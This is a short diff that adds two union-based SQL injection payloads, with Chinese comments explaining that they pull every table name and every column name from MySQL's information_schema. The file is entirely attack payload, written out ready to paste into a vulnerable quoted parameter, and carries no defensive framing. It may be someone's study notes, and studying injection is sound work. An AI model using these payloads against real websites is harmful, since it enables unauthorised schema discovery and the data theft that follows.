@@ -1,0 +1,8 @@
+#这一句可以通过查询mysql的表管理表，查出所有数据库中的所有表名信息
+' union select table_name from information_schema.columns where 't'='t
+
+#这一句可以通过查询mysql的列管理表，查出所有数据库中的所有列名信息
+' union select column_name from information_schema.columns where 't'='t
+
+
+ 
